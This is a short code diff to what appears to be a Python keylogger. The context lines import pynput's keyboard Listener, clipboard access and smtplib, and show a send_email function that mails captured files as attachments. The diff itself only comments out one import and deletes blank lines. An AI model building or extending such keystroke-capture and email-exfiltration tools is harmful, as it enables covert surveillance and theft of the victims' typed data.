@@ -7,7 +7,7 @@ import smtplib
 import socket
 import platform
 
-import win32clipboard
+#import win32clipboard
 
 from pynput.keyboard import Key, Listener
 
@@ -87,76 +87,3 @@ def send_email(filename, attachment, toaddr):
     text = msg.as_string()
     s.sendmail(fromaddr, toaddr, text)
     s.quit()
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
